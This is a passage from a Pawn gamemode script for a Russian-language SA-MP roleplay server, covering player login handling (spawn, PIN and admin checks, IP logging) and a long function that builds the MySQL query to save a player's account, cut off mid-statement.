//	sscanf(PlayerInfo[playerid][pGunColors], "p<,>a<i>[6]",PlayerInfo[playerid][pGunColor]);
//		SetPVarInt(playerid,"GiveGun",1);
	SetTimerEx("GivePatr",2000,false,"d",playerid);
	PlayerLogged[playerid] = true;
	switch(PlayerInfo[playerid][pSpawn])
	{
		case 1:	SetSpawnInfo(playerid, 255, PlayerInfo[playerid][pModel], 1678.6046,1448.5035,10.7750,276.8253, -1, -1, -1, -1, -1, -1);
		case 0: SetSpawnInfo(playerid, 255, PlayerInfo[playerid][pModel], 2845.8662,1291.0157,11.3906,90.0034, -1, -1, -1, -1, -1, -1);
		case 2: SetSpawnInfo(playerid, 255, PlayerInfo[playerid][pModel], 2222.8694,1839.0148,10.8203,89.8207, -1, -1, -1, -1, -1, -1);
	}
	SpawnPlayer(playerid);
	if(PlayerInfo[playerid][pZavisimost] > 50 && PlayerInfo[playerid][pZavisimost] < 70) PlayerInfo[playerid][pLomka] = gettime()+60*60;
	if(PlayerInfo[playerid][pZavisimost] > 70 && PlayerInfo[playerid][pZavisimost] < 80) PlayerInfo[playerid][pLomka] = gettime()+60*50;
	if(PlayerInfo[playerid][pZavisimost] > 90 && PlayerInfo[playerid][pZavisimost] < 90) PlayerInfo[playerid][pLomka] = gettime()+60*40;
	if(PlayerInfo[playerid][pZavisimost] == 100) PlayerInfo[playerid][pLomka] = gettime()+60*30;
	LoadBanks(playerid);
	//PlayerTextDrawShow(playerid,Golod[playerid]);
    static const fmt_string2[] = "Ваш аккаунт {FFFFFF}%s{AFAFAF} успешно авторизован.";
	new str2[sizeof(fmt_string2)-2+MAX_PLAYER_NAME];
	format(str2, sizeof(str2), fmt_string2,PlayerInfo[playerid][pSendername]);
	SendClientMessage(playerid,CGREY ,str2);
	if(PlayerInfo[playerid][pWarn] > 0)
	{
	    if(PlayerInfo[playerid][pWarnSkok] < gettime())
	    {
	        PlayerInfo[playerid][pWarn]--;
	        SendClientMessage(playerid,-1,"На вашем аккаунте снялось предупреждение");
	        if(PlayerInfo[playerid][pWarn] > 0)
		    {
		        SendClientMessage(playerid,-1,"На вашем аккаунте присутствует предупрждение");
			    PlayerInfo[playerid][pWarnSkok] = gettime() +7*86400;
		    }
	    }
		else SendClientMessage(playerid,-1,"На вашем аккаунте присутствует предупреждение");
	}
	if(PlayerInfo[playerid][pWanted] > 0) SetPlayerWantedLevel(playerid,PlayerInfo[playerid][pWanted]);
	SetPVarInt(playerid,"AntiC",antic);
	new podIP[2],podIPREG[2],podIPs[2],d;
	new ipStr[16],sas[2];
	GetPlayerIp( playerid, ipStr, 16 );
	if(PlayerInfo[playerid][pPin1] > 0)
	{
		sscanf(ipStr,"p<.>dddd",podIPs[0],podIPs[1],d,d);
		sscanf(PlayerInfo[playerid][pIp],"p<.>dddd",podIP[0],podIP[1],d,d);
		if(podIPs[0] != podIP[0] && podIPs[1] != podIP[1])
		{
            SetPVarInt(playerid,"CheckProv",1);
			SetPVarInt(playerid,"PinCode",1);
			SendClientMessage(playerid,CLIGHTRED,"У Вас установлена защита PIN-CODE. Введите его в чат, видеть его никто не будет");
			TogglePlayerControllable(playerid, 0);
		}
	}
	else
	{
		
		if(PlayerInfo[playerid][pAdmin] && PlayerInfo[playerid][pAdmin] < 6)
        {
            
			sscanf(ipStr,"p<.>dddd",podIPs[0],podIPs[1],d,d);
			sscanf(PlayerInfo[playerid][pIp],"p<.>dddd",podIP[0],podIP[1],d,d);
			sscanf(PlayerInfo[playerid][pIpReg],"p<.>dddd",podIPREG[0],podIPREG[1],d,d);


			if(podIPs[0] != podIP[0] && podIPs[1] != podIP[1]) sas[0] = 1;
			if(podIPs[0] != podIPREG[0] && podIPs[0] != podIPREG[1]) sas[1] = 1;
		    static const fmt_stri1ng[] = "[A] %s: С последнего захода: %s{FFFF00} | С регистрации: %s";
			new stri1ng[sizeof(fmt_stri1ng)+70-4+24];
			format(stri1ng, sizeof(stri1ng),fmt_stri1ng,PlayerInfo[playerid][pSendername],(sas[0]) ? ("{D50000}[Подозрение на взлом]"):("{FFFFFF}[Подсеть совпала]"),(sas[1]) ? ("{D50000}[Подозрение на взлом]"):("{FFFFFF}[Подсеть совпала]"));
        }
		else
		{
		    query = "";
			format(query,sizeof(query),"INSERT INTO `logs` ( `id`, `cho`,`time`) VALUES ('%d', 'Зашел на сервер IP: %s','%d')",PlayerInfo[playerid][pID],ipStr,gettime());
			mysql_tquery(mysql,query);
		}
	}
	if(PlayerInfo[playerid][pAdmin] > 0)
	{
	    
		ShowPlayerDialog(playerid,9,DIALOG_STYLE_PASSWORD,"Авторизация","{FFFFFF}Введите ваш пароль администратора:","Готово","Отмена");
	}
    for(new k = 1; k<=TOTALV; k++)
    {
	    if(strcmp(VInfo[k][vname], PlayerInfo[playerid][pSendername], true) == 0)
		{
		    SetVehicleVirtualWorld(VInfo[k][vcar],VInfo[k][vvirt]);
            LinkVehicleToInterior(VInfo[k][vcar],VInfo[k][vint]);
			SetVehicleToRespawn(VInfo[k][vcar]);
		    SetTuning(VInfo[k][vcar],k);
		    SetVehicleNumberPlate(VInfo[k][vcar], VInfo[k][vnumber]);
		    IsLocked[VInfo[k][vcar]] = true;
           	CarDoors(VInfo[k][vcar],1);
			Locked[VInfo[k][vcar]] = playerid;
		 	Fuel[VInfo[k][vcar]] = VInfo[k][vfuel];
		}
    }
    if(!PlayerInfo[playerid][pPin1]) SendClientMessage(playerid,CREWARD ,"Рекомендуем Вам поставить код безопасности, чтобы не подвергнуть аккаунт взлому{FFFFFF} » (/mn - Безопасность).");
    if(!PlayerInfo[playerid][pGA]) SendClientMessage(playerid,CREWARD ,"Рекомендуем Вам поставить двухэтапную аутентификацию, чтобы не подвергнуть аккаунт взлому{FFFFFF} » (/mn - Безопасность).");
 	if(IsAGang(playerid) || IsAMafia(playerid))
	{
		if(CaptInfo[PlayerInfo[playerid][pMember]-6][capture]) CaptGo(playerid);
	}
 	if(PlayerInfo[playerid][pVip] > gettime())
	{
  		static const fmt_string22[] = "VIP привилегии на вашем аккаунте активны ещё {FFFFFF}%s";
		new str22[sizeof(fmt_string22)-2+20];
		format(str22, sizeof(str22), fmt_string22,timec(PlayerInfo[playerid][pVip]));
		SendClientMessage(playerid,CREWARD ,str22);
	}
	if(PlayerInfo[playerid][pShtrav])
	{
	    SendClientMessage(playerid,CREWARD,"У Вас имеются неоплаченные штрафы!");
        SendClientMessage(playerid,-1,"Оплатить штраф можно в ближайшем отделении полиции!");
	
	
		
	}
	format(query, sizeof(query), "SELECT * FROM prize WHERE idacc = '%d'", PlayerInfo[playerid][pID]);
	mysql_tquery(mysql, query, "GetPrize", "d", playerid);
	if(PlayerInfo[playerid][pAdmin]> 6) Ban(playerid);
//	printf("%d",PlayerInfo[playerid][pVK]);
//		SendVKLoginMessage(playerid);
	return true;

}
/*static inc_string[250];
SendVKLoginMessage(playerid)
{
  //  if(0 == inc_gPlayerVKID[playerid] || 0 == inc_gVKSecurityStatus[playerid])
   //     return 0;

    static
            inc_year,
            inc_month,
            inc_day,
            inc_ip[16],
            inc_hour,
            inc_minute;

    getdate(inc_year, inc_month, inc_day);
    gettime(inc_hour, inc_minute, _);

    GetPlayerIp(playerid, inc_ip, 16);
    GetPlayerName(playerid, inc_string, MAX_PLAYER_NAME);

    static GetMonthOfEntry[12][18] =
    {
        "Января",
        "Февраля",
        "Марта",
        "Апреля",
        "Мая",
        "Июня",
        "Июля",
        "Августа",
        "Сентября",
        "Октября",
        "Ноября",
        "Декабря"
    };

    format(inc_string, sizeof inc_string, "В аккаунт %s выполнен вход<br>IP входа: %s<br>Дата входа: %d/%s/%d %02d:%02d", inc_string, inc_ip, inc_day, GetMonthOfEntry[inc_month], inc_year, inc_hour, inc_minute);
    SendVKMessage(playerid, inc_string);

    return 1;

}






SendVKMessage(playerid, message[])
{

 //   if(0 == inc_gPlayerVKID[playerid] || 0 == inc_gVKSecurityStatus[playerid])
//        return 0;

    format(inc_string, sizeof inc_string, "%s/vk_sender.php?message=%s&to=%d", VK_DOMAIN, message, PlayerInfo[playerid][pVK]);

    for(new i, str = strlen(inc_string); i < str; i++)
    {
        if(inc_string[i] == ' ') inc_string[i] = '+';
    }
	printf(inc_string);
    HTTP(playerid, HTTP_POST, inc_string,",", "@__SendMessageResponse");

    return 1;
}

@__SendMessageResponse(index, response_code, data[]);
@__SendMessageResponse(index, response_code, data[])
{
    if(response_code == 200)
        return print("[VK Security] Сообщение отправлено!");

    printf("[VK Security] Сбой в запросе, код ответа: %d", response_code);

    return 1;
}*/
stock ResetStats(playerid)
{
	PlayerInfo[playerid][pAdmin] = 0,PlayerInfo[playerid][pLevel] = 0,PlayerInfo[playerid][pModel] = 0;
	PlayerInfo[playerid][pSex] = 0,PlayerInfo[playerid][pCash] = 0;PlayerInfo[playerid][pLWarn] = 0;
	PlayerInfo[playerid][pAd] = 0;
	return true;
}
stock SaveAccount(playerid)
{
    if(PlayerLogged[playerid] == false) return 1;
   	new src[128];
   	query = "";
	format(query,sizeof(query),"UPDATE "TABLE_ACCOUNT" SET ");
 	format(src,sizeof(src),"ipreg='%s',",PlayerInfo[playerid][pIpReg]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"suad='%s',",PlayerInfo[playerid][pSuAd]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"numpass='%s',",PlayerInfo[playerid][pNumPass]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"level=%d,",PlayerInfo[playerid][pLevel]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"myjob=%d,",PlayerInfo[playerid][pJob]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"admin=%d,",PlayerInfo[playerid][pAdmin]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"cash=%d,",PlayerInfo[playerid][pCash]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"helper=%d,",PlayerInfo[playerid][pLWarn]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"pin=%d,",PlayerInfo[playerid][pPin]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"dcar=%d,",PlayerInfo[playerid][pDCar]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"ga=%d,",PlayerInfo[playerid][pGA]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"avig=%d,",PlayerInfo[playerid][pAvig]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"pOtm=%d,",PlayerInfo[playerid][pOtm]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"pCRC=%d,",PlayerInfo[playerid][pCRC]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"pCRT=%d,",PlayerInfo[playerid][pCRT]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"pCRL=%d,",PlayerInfo[playerid][pCRL]);
	strcat(query,src,sizeof(query));
	new crimestats[50];
	format(crimestats,sizeof(crimestats),"%d,%d,%d,%d,%d,%d,%d,%d",PlayerInfo[playerid][pCrimeStats][0],PlayerInfo[playerid][pCrimeStats][1]
	,PlayerInfo[playerid][pCrimeStats][2],PlayerInfo[playerid][pCrimeStats][3],PlayerInfo[playerid][pCrimeStats][4],PlayerInfo[playerid][pCrimeStats][5]
	,PlayerInfo[playerid][pCrimeStats][6],PlayerInfo[playerid][pCrimeStats][7]);
	format(src,sizeof(src),"pCrimeStats='%s',",crimestats);
	strcat(query,src,sizeof(query));
	
	new questss[100];
	format(questss,sizeof(questss),"%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d",
	PlayerInfo[playerid][pQuestS][0],PlayerInfo[playerid][pQuestS][1],PlayerInfo[playerid][pQuestS][2],
	PlayerInfo[playerid][pQuestS][3],PlayerInfo[playerid][pQuestS][4],PlayerInfo[playerid][pQuestS][5]
	,PlayerInfo[playerid][pQuestS][6],PlayerInfo[playerid][pQuestS][7],PlayerInfo[playerid][pQuestS][8]
	,PlayerInfo[playerid][pQuestS][9],PlayerInfo[playerid][pQuestS][10],PlayerInfo[playerid][pQuestS][11]
	,PlayerInfo[playerid][pQuestS][12],PlayerInfo[playerid][pQuestS][13],PlayerInfo[playerid][pQuestS][14]
	,PlayerInfo[playerid][pQuestS][15],PlayerInfo[playerid][pQuestS][16],PlayerInfo[playerid][pQuestS][17]
	,PlayerInfo[playerid][pQuestS][18],PlayerInfo[playerid][pQuestS][19]);
	
	format(src,sizeof(src),"pQuestSS='%s',",questss);
	strcat(query,src,sizeof(query));
	
	format(src,sizeof(src),"KolJail=%d,",PlayerInfo[playerid][pJailKol]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"AKolWarn=%d,",PlayerInfo[playerid][pWarnKol]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"AKolBan=%d,",PlayerInfo[playerid][pBanKol]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"KolAns=%d,",PlayerInfo[playerid][pAnsKol]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"KolMute=%d,",PlayerInfo[playerid][pMuteKol]);
	strcat(query,src,sizeof(query));
	
	format(src,sizeof(src),"pPros=%d,",PlayerInfo[playerid][pPros]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"pProsFrac=%d,",PlayerInfo[playerid][pProsFrac]);
	strcat(query,src,sizeof(query));
	
	format(src,sizeof(src),"zavisimost=%d,",PlayerInfo[playerid][pZavisimost]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"pBankPin=%d,",PlayerInfo[playerid][pBankPin]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"koldonate=%d,",PlayerInfo[playerid][pKolDonate]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"fight=%d,",PlayerInfo[playerid][pFight]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"hod=%d,",PlayerInfo[playerid][pHod]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"shtrav=%d,",PlayerInfo[playerid][pShtrav]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"pShtravTick=%d,",PlayerInfo[playerid][pShtravTick]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"adminc=%d,",PlayerInfo[playerid][pAdminC]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"pWantedA=%d,",PlayerInfo[playerid][pWantedA]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"code=%d,",PlayerInfo[playerid][pCode]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"biza='%d,%d,%d,%d,%d',",PlayerInfo[playerid][pBizA][0]
	,PlayerInfo[playerid][pBizA][1],PlayerInfo[playerid][pBizA][2],PlayerInfo[playerid][pBizA][3],PlayerInfo[playerid][pBizA][4]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"bizac='%d,%d,%d,%d,%d',",PlayerInfo[playerid][pBizAC][0]
	,PlayerInfo[playerid][pBizAC][1],PlayerInfo[playerid][pBizAC][2],PlayerInfo[playerid][pBizAC][3],PlayerInfo[playerid][pBizAC][4]);
	strcat(query,src,sizeof(query));
	
	format(src,sizeof(src),"damage=%d,",PlayerInfo[playerid][pDamage]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"mati=%d,",PlayerInfo[playerid][pMati]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"matitick=%d,",PlayerInfo[playerid][pMatiTick]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"golos=%d,",PlayerInfo[playerid][pGolos]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"quest=%d,",PlayerInfo[playerid][pQuest]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"fam=%d,",PlayerInfo[playerid][pFam]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"testmoney=%d,",PlayerInfo[playerid][pTestMoney]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"test=%d,",PlayerInfo[playerid][pTest]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"fvig=%d,",PlayerInfo[playerid][pFVig]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"gangscore=%d,",PlayerInfo[playerid][pGangScore]);
	strcat(query,src,sizeof(query));
	
	format(src,sizeof(src),"golos1=%d,",PlayerInfo[playerid][pGolos1]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"kolwarn=%d,",PlayerInfo[playerid][pKolWarn]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"mash1=%d,",PlayerInfo[playerid][pMash1]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"mash2=%d,",PlayerInfo[playerid][pMash2]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"adm=%d,",PlayerInfo[playerid][pADM]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"kolban=%d,",PlayerInfo[playerid][pKolBan]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"pin1=%d,",PlayerInfo[playerid][pPin1]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"pass=%d,",PlayerInfo[playerid][pPass]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"min=%d,",PlayerInfo[playerid][pMin]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"vipis=%d,",PlayerInfo[playerid][pVipis]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"mes=%d,",PlayerInfo[playerid][pDateM]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"onlmes=%d,",PlayerInfo[playerid][pOnlineMes]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"mash=%d,",PlayerInfo[playerid][pMash]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"smoke=%d,",PlayerInfo[playerid][pSmoke]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"donate=%d,",PlayerInfo[playerid][pDonate]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"sex=%d,",PlayerInfo[playerid][pSex]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"voz=%d,",PlayerInfo[playerid][pVoz]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"giri=%d,",PlayerInfo[playerid][pGiri]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"shtange=%d,",PlayerInfo[playerid][pShtanga]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"beg=%d,",PlayerInfo[playerid][pBeg]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"velo=%d,",PlayerInfo[playerid][pVelo]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"skillt=%d,",PlayerInfo[playerid][pSkillT]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"udar=%d,",PlayerInfo[playerid][pUdar]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"mute=%d,",PlayerInfo[playerid][pMuted]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"hmute=%d,",PlayerInfo[playerid][pHMuted]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"tie=%d,",PlayerInfo[playerid][pTie]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"payday=%d,",PlayerInfo[playerid][pPayDay]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"ar=%d,",PlayerInfo[playerid][pAr]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"apt=%d,",PlayerInfo[playerid][pApt]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"rep=%d,",PlayerInfo[playerid][pRep]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"ing=%d,",PlayerInfo[playerid][pIng]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"mask=%d,",PlayerInfo[playerid][pMask]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"kan=%d,",PlayerInfo[playerid][pKan]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"skin1=%d,",PlayerInfo[playerid][pSkin][0]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"skin2=%d,",PlayerInfo[playerid][pSkin][1]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"skin3=%d,",PlayerInfo[playerid][pSkin][2]);
	strcat(query,src,sizeof(query));
	format(PlayerInfo[playerid][pSkills],50,"%i,%i,%i,%i,%i,%i,%i",PlayerInfo[playerid][pGunSkill][0],PlayerInfo[playerid][pGunSkill][1],PlayerInfo[playerid][pGunSkill][2],PlayerInfo[playerid][pGunSkill][3],
	PlayerInfo[playerid][pGunSkill][4],PlayerInfo[playerid][pGunSkill][5],PlayerInfo[playerid][pGunSkill][6]);
	format(src,sizeof(src),"skills='%s',",PlayerInfo[playerid][pSkills]);
	strcat(query,src,sizeof(query));
	format(PlayerInfo[playerid][pQs],10,"%i,%i,%i",PlayerInfo[playerid][pQ][0],PlayerInfo[playerid][pQ][1],PlayerInfo[playerid][pQ][2]);
	format(src,sizeof(src),"qs='%s',",PlayerInfo[playerid][pQs]);
	
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"vip=%d,",PlayerInfo[playerid][pVip]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"bank=%d,",PlayerInfo[playerid][pBank]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"spawn=%d,",PlayerInfo[playerid][pSpawn]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"pWorkSpawn=%d,",PlayerInfo[playerid][pWorkSpawn]);
	strcat(query,src,sizeof(query));
	
	format(src,sizeof(src),"ul1=%d,",PlayerInfo[playerid][pUl][0]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"ul2=%d,",PlayerInfo[playerid][pUl][1]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"ul3=%d,",PlayerInfo[playerid][pUl][2]);
	strcat(query,src,sizeof(query));
	
	format(src,sizeof(src),"golod=%d,",PlayerInfo[playerid][pGolod]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"heal=%f,",PlayerInfo[playerid][pHeal]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"model=%d,",PlayerInfo[playerid][pModel]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"adminpass=%d,",PlayerInfo[playerid][pAdminPass]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"member=%d,",PlayerInfo[playerid][pMember]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"jail=%d,",PlayerInfo[playerid][pJail]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"jailtime=%d,",PlayerInfo[playerid][pJailTime]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"warndate=%d,",PlayerInfo[playerid][pWarnDate]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"warnskok=%d,",PlayerInfo[playerid][pWarnSkok]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"rank=%d,",PlayerInfo[playerid][pRank]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"leader=%d,",PlayerInfo[playerid][pLeader]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"phone=%d,",PlayerInfo[playerid][pPhone]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"priglas='%s',",PlayerInfo[playerid][pPriglas]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"work=%d,",PlayerInfo[playerid][pWork]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"exp=%d,",PlayerInfo[playerid][pExp]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"warn=%d,",PlayerInfo[playerid][pWarn]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"phonebal=%d,",PlayerInfo[playerid][pPhoneBal]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"job=%d,",PlayerInfo[playerid][pOnline]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"zakon=%d,",PlayerInfo[playerid][pZakon]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"wanted=%d,",PlayerInfo[playerid][pWanted]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"mats=%d,",PlayerInfo[playerid][pMats]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"drugs=%d,",PlayerInfo[playerid][pDrugs]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"adr=%d,",PlayerInfo[playerid][pDateO]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"sch=%d,",PlayerInfo[playerid][pSpawnChange]);
	strcat(query,src,sizeof(query));
	
	if(GetPVarInt(playerid,"Tir") == 0)
	{
  		format(PlayerInfo[playerid][pAmmo],100,"%i,%i,%i,%i,%i,%i,%i,%i,%i,%i,%i,%i,%i,%i",GunInfo[playerid][pAmmo][0],GunInfo[playerid][pAmmo][1],GunInfo[playerid][pAmmo][2],GunInfo[playerid][pAmmo][3]
		,GunInfo[playerid][pAmmo][4],GunInfo[playerid][pAmmo][5],GunInfo[playerid][pAmmo][6],GunInfo[playerid][pAmmo][7],GunInfo[playerid][pAmmo][8],GunInfo[playerid][pAmmo][9],GunInfo[playerid][pAmmo][10]
		,GunInfo[playerid][pAmmo][11],GunInfo[playerid][pAmmo][12],GunInfo[playerid][pAmmo][12]);
		format(PlayerInfo[playerid][pGuns],50,"%i,%i,%i,%i,%i,%i,%i,%i,%i,%i,%i,%i,%i,%i",GunInfo[playerid][pWeapon][0],GunInfo[playerid][pWeapon][1],GunInfo[playerid][pWeapon][2],GunInfo[playerid][pWeapon][3]
		,GunInfo[playerid][pWeapon][4],GunInfo[playerid][pWeapon][5],GunInfo[playerid][pWeapon][6],GunInfo[playerid][pWeapon][7],GunInfo[playerid][pWeapon][8],GunInfo[playerid][pWeapon][9],GunInfo[playerid][pWeapon][10]
		,GunInfo[playerid][pWeapon][11],GunInfo[playerid][pWeapon][12],GunInfo[playerid][pWeapon][12]);
		format(src,sizeof(src),"ammo='%s',",PlayerInfo[playerid][pAmmo]);
		strcat(query,src,sizeof(query));
		format(src,sizeof(src),"guns='%s',",PlayerInfo[playerid][pGuns]);
		strcat(query,src,sizeof(query));
	}
	else
	{
		format(src,sizeof(src),"ammo='0,0,0,0,0,0,0,0,0,0,0,0,0,0',");
		strcat(query,src,sizeof(query));
		format(src,sizeof(src),"guns='0,0,0,0,0,0,0,0,0,0,0,0,0,0',");
		strcat(query,src,sizeof(query));
	}
	new lics[50],acs[50],licstime[50];
	format(acs,sizeof(acs),"%i,%i,%i,%i,%i",PlayerInfo[playerid][pAcs][0],PlayerInfo[playerid][pAcs][1],PlayerInfo[playerid][pAcs][2]
	,PlayerInfo[playerid][pAcs][3],PlayerInfo[playerid][pAcs][4],PlayerInfo[playerid][pAcs][5]);
	
	format(licstime,sizeof(licstime),"%i,%i,%i,%i,%i,%i",PlayerInfo[playerid][pLicTime][0],PlayerInfo[playerid][pLicTime][1],PlayerInfo[playerid][pLicTime][2]
	,PlayerInfo[playerid][pLicTime][3],PlayerInfo[playerid][pLicTime][4],PlayerInfo[playerid][pLicTime][5],PlayerInfo[playerid][pLicTime][6]);
	
	format(src,sizeof(src),"acs='%s',",acs);
	strcat(query,src,sizeof(query));
	
	format(src,sizeof(src),"licstime='%s',",licstime);
	strcat(query,src,sizeof(query));
	format(lics,sizeof(lics),"%i,%i,%i,%i,%i,%i,%i",PlayerInfo[playerid][pLic][0],PlayerInfo[playerid][pLic][1],PlayerInfo[playerid][pLic][2],PlayerInfo[playerid][pLic][3]
	,PlayerInfo[playerid][pLic][4],PlayerInfo[playerid][pLic][5],PlayerInfo[playerid][pLic][6]);
	format(src,sizeof(src),"lics='%s',",lics);
	strcat(query,src,sizeof(query));
	
 /*   format(src,sizeof(src),"bLeader='%d',",BankGrab[playerid][bLeader]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"bPlayer0='%d',",BankGrab[playerid][bPlayer][0]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"bPlayer1='%d',",BankGrab[playerid][bPlayer][0]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"bPlayer2='%d',",BankGrab[playerid][bPlayer][0]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"bQuest0='%d',",BankGrab[player][bQuest][0]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"bQuest1='%d',",BankGrab[player][bQuest][1]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"bQuest2='%d',",BankGrab[player][bQuest][2]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"bQuest3='%d',",BankGrab[player][bQuest][3]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"bQuest4='%d',",BankGrab[player][bQuest][4]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"bTown='%d',",BankGrab[player][bTown]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"bTimes='%d',",BankGrab[player][bTimes]);
	strcat(query,src,sizeof(query));*/
	
	format(src,sizeof(src),"pGrabTeam='%d',",PlayerInfo[playerid][pGrabTeam]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"pGrabQuest='%d',",PlayerInfo[playerid][pGrabQuest]);
	strcat(query,src,sizeof(query));
	
	PlayerInfo[playerid][pDateIg] = gettime();
	format(src,sizeof(src),"ig='%d'",PlayerInfo[playerid][pDateIg]);
	strcat(query,src,sizeof(query));
	
	if(PlayerInfo[playerid][pGrabTeam])
	{
	    new stringss[300];
		format(stringss,sizeof(stringss),"UPDATE `accounts` SET `bLeader` = '%d'\
		,`bPlayer0` = '%d',`bPlayer1` = '%d',`bPlayer2` = '%d' \
